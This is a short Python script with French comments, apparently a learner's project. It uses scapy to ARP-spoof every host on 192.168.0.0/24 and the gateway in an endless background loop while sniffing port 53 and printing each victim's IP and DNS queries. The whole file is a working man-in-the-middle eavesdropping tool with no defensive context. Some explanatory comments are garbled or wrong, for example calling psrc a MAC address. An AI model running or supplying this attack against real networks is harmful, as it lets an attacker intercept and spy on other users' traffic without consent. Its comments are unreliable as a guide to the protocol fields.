import logging
from scapy.all import ARP , send ,sniff ,IP  #pour faire ARP attaque
from scapy.layers.dns import DNS, DNSQR, DNSRR# pour faire DNS attaque 
import threading # pour faire thread si il ya un errore il continue l'attaque


logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  #pour enregistrer les errore et c'est errore de quelle bib

def arp_spoofing(target_ip,spoof_ip):     #on va faire la fonction de attaque arp spoofing et pour les parametre on a spoof ip et de mon ip
    packet =ARP(op=2 , pdst=target_ip , hwdst='ff:ff:ff:ff:ff:ff', psrc=spoof_ip) #pour faire ARP attaque ET POUR LE PDST POUR AFFICHER TOUS LES PC OU LES IP CONNECTER AUX MAIM RESEAU   ET POUR HWDST C'EST DE MAC ADRESS QUI JE VEUT LE ENVOIER AUX TOUS C'EST APPARERILLE CONNECTER   ET POUR PSRC C'EST QUI ENVOIER C'EST MAC ADRESS DANS NOTRE CAS C'EST SPOOF IP    
     # ARP => ARP Request  | ARP Reply   c'est c'a les deux operation de arp
     # op => c'est option et on a deux option : 1 / 2   et dans notre cas je choisire la deuxiem option c'est 2 qui recue les packets 
     #pdst => prtocole distination c'est addire le ip adress target
     #hwdst => hardware distination c'est mac adress de la victime
     #psrc => protocole source c'est mac adress de router ou ip de attaquer 
    send(packet , verbose=0) # pour envoyer le packet et verbose 0 pour ne pas afficher les packets
   



def dns_packets(packet):   # les packets sont envoyer aux c'est fonction
    if packet.haslayer(DNS)and packet.getlayer(DNS).qr == 0:  # si le packet contient dns    et pour getlayer c'est pour recuperer le protocole dns
        ip_src = packet[IP].src  # pour recuperer l'ip source
        dns_query =packet[DNSQR].qname.decode("utf-8") # pour recuperer le dns query
        print(f"{ip_src:<15} \t {dns_query:<30}")




def start_arp_spoofing(target_ip, gateway_ip):  
    while True:    # pour rest marche
        arp_spoofing(target_ip,gateway_ip)  # tous les packets de victime vers router
        arp_spoofing(gateway_ip,target_ip)  # tous les packets qui sort de router vers victime


target_ip = "192.168.0.0/24" # tous les ip adress qui est connecter dans maim reseau
gateway_ip = "192.168.0.1" # ip du gateway  et ip adress de router


threading.Thread(target=start_arp_spoofing, args=(target_ip, gateway_ip) , daemon=True).start()   # faire la fonction de start arp qui contien deux argument target and gateway / et pour daemeon si fermer le progrem le daemon fermer le 

print("[+] ARP spoofing started : ")
print("-" * 50)
print(f"{'IP Address':<15} \t {'DNS Query':<30}")
#  IP Adress            DNS Query          
print("-" * 50)
sniff(filter="udp port 53" , prn = dns_packets , store=0) # store 0 pour ne pas enregistrer les packets dans la memoire  et pour le filtrage de protocole de udp car le protocole de dns est udp qui est dans la port 53 et apres j'ai printer dns packets


